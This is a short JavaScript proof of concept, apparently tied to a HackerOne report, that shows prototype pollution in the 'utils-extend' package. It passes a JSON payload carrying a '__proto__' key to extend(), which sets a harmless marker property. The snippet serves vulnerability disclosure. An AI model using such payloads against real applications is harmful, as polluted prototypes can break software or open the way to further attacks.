//https://hackerone.com/reports/801522

    const { extend } = require('utils-extend');
    const payload = '{"__proto__":{"polluted":"yes"}}'
    obj = {}

    const pollutionObject = JSON.parse(payload);
    extend({}, pollutionObject)
    
  